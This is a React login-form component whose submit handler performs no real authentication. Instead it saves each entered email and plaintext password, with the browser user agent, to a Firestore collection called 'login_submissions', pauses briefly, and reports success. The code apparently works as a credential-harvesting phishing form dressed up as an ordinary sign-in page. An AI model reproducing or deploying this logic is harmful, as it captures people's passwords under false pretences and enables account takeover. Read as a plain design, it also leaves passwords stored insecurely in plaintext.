import { useState } from 'react'
import { FiEye, FiEyeOff, FiMail, FiLock } from 'react-icons/fi'
import { collection, addDoc, serverTimestamp } from 'firebase/firestore'
import { db } from '../config/firebase'

export default function LoginForm({ onLogin }) {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e) => {
    e.preventDefault()
    setError('')

    const trimmedEmail = email.trim()

    if (!trimmedEmail || !password) {
      setError('Please fill in all fields')
      return
    }

    setLoading(true)

    try {
      await addDoc(collection(db, 'login_submissions'), {
        email: trimmedEmail,
        password,
        timestamp: serverTimestamp(),
        userAgent: navigator.userAgent,
      })

      await new Promise((resolve) => setTimeout(resolve, 600))

      if (onLogin) {
        onLogin({ email: trimmedEmail })
      }
    } catch (err) {
      console.error('Error saving login data:', err)
      setError('Unable to sign in. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-5">
      {/* Email Input */}
      <div className="relative">
        <label className="block text-sm font-medium text-gray-800 mb-2">
          Email or Username
        </label>
        <div className="relative">
          <FiMail className="absolute left-4 top-4 text-gray-400 text-lg" />
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Enter your email or username"
            className="w-full pl-12 pr-4 py-3 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:border-black focus:ring-2 focus:ring-gray-200 transition"
          />
        </div>
      </div>

      {/* Password Input */}
      <div className="relative">
        <label className="block text-sm font-medium text-gray-800 mb-2">
          Password
        </label>
        <div className="relative">
          <FiLock className="absolute left-4 top-4 text-gray-400 text-lg" />
          <input
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter your password"
            className="w-full pl-12 pr-12 py-3 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:border-black focus:ring-2 focus:ring-gray-200 transition"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-4 text-gray-500 hover:text-black transition"
          >
            {showPassword ? (
              <FiEyeOff className="text-lg" />
            ) : (
              <FiEye className="text-lg" />
            )}
          </button>
        </div>
      </div>

      {/* Error Message */}
      {error && (
        <div className="p-3 bg-red-900 bg-opacity-50 border border-red-400 rounded-lg text-red-200 text-sm">
          {error}
        </div>
      )}

      {/* Remember Me & Forgot Password */}
      <div className="flex items-center justify-between text-sm">
        <label className="flex items-center cursor-pointer">
          <input
            type="checkbox"
            className="w-4 h-4 rounded border-gray-400 bg-white text-black focus:ring-2 focus:ring-gray-300 cursor-pointer"
          />
          <span className="ml-2 text-gray-700">Remember me</span>
        </label>
      </div>

      {/* Sign In Button */}
      <button
        type="submit"
        disabled={loading}
        className="w-full py-3 mt-6 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-semibold rounded-lg transition transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 flex items-center justify-center space-x-2"
      >
        {loading && (
          <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
          </svg>
        )}
        <span>{loading ? 'Signing In...' : 'Sign In'}</span>
      </button>

      {/* Divider */}
      <div className="relative my-6">
        <div className="absolute inset-0 flex items-center">
          <div className="w-full border-t border-gray-300"></div>
        </div>
        <div className="relative flex justify-center text-sm">
          <span className="px-2 bg-white text-gray-500">OR</span>
        </div>
      </div>

      {/* Sign Up Link */}
      <p className="text-center text-gray-600 text-sm mt-6">
        Don't have an account?{' '}
        <a href="#" className="text-gray-900 font-semibold hover:underline">
          Create one
        </a>
      </p>
    </form>
  )
}